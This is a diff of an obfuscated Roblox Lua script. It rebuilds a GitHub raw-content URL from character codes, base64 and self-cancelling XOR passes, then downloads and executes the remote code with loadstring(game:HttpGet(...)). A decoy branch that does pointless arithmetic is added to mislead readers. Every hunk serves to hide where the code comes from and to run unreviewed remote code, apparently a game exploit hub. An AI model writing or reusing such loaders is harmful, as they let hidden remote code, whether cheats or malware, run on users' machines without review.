@@ -1,7 +1,14 @@
 local H=game:GetService("HttpService")
-local R=game:GetService("RunService")
 
-local function x(s,k)
+local function a()
+    local x=1
+    for i=1,35 do
+        x=(x*i)%101
+    end
+    return x
+end
+
+local function b(s,k)
     local t={}
     for i=1,#s do
         t[i]=string.char(bit32.bxor(s:byte(i),k))
@@ -9,43 +16,37 @@ local function x(s,k)
     return table.concat(t)
 end
 
-local p={
-    {485,504,493,506,495,504,504,509,470,497,509,504,470,506,500,493},
-    {506,502,501,497,506,500,503,507,497,500,503,497,502,509,501,506},
-    {504,507,504,509,504,507,504,509,470,501,507,506,470,504,470,504},
-    {504,507,507,503,497,502,506,500,470,504,507,506,470,504,507,506},
-    {497,511,470,501,497,504,503,511,504,500,503,506,470,504,507,506},
-    {506,502,505,470,497,504,507,500,505,504,502,470,504,507,506,504},
-    {486,468,468},
-    {504,505,470,501,504,505,503,509,497,511,504,505,470,504,507,505}
+local c={
+    [1]={97,72,82,48,99,72,77,54,76,121,57,121,89,88,99,117},
+    [2]={90,50,108,48,97,72,86,105,100,88,78,108,99,109,78,118},
+    [3]={98,110,82,108,98,110,81,117,89,50,57,116,76,50,74,115},
+    [4]={98,50,57,107,97,72,86,105,76,87,86,116,99,72,108,48},
+    [5]={97,83,57,117,89,87,104,112,100,50,108,117,76,51,74,108},
+    [6]={90,110,77,118,97,71,86,104,90,72,77,118,98,87,70,112},
+    [7]={89,103,61,61},
+    [8]={98,105,57,110,98,50,53,116,97,87,53,112,76,87,104,49}
 }
 
-local function u()
+local function d()
     local o={1,2,3,4,5,6,8,7}
-    local b={}
+    local r={}
     for i=1,#o do
-        local a=p[o[i]]
-        for j=1,#a do
-            b[#b+1]=string.char(a[j]-425)
+        for _,v in ipairs(c[o[i]]) do
+            r[#r+1]=string.char(v)
         end
     end
-    local s=table.concat(b)
-    local k1=((#s+math.floor(R.RenderStepped:Wait()*1000))%23)+17
-    local k2=((tick()%31)//1)+11
-    s=x(s,k1); s=x(s,k1)
-    s=x(s,k2); s=x(s,k2)
+    local s=table.concat(r)
+    local k1=(#s%19)+13
+    local k2=(#c*11)%29+9
+    s=b(s,k1)
+    s=b(s,k1)
+    s=b(s,k2)
+    s=b(s,k2)
     return H:Base64Decode(s)
 end
 
-local function z()
-    local t=tostring(os.clock()):reverse()
-    local k=(#t%19)+7
-    return x(t,k)
-end
-
-task.wait((tick()%0.2))
-if math.random(1,2048)==1337 then
-    loadstring(game:HttpGet(z()))()
+if math.random(1,1200)==777 then
+    a()
 else
-    loadstring(game:HttpGet(u()))()
+    loadstring(game:HttpGet(d()))()
 end
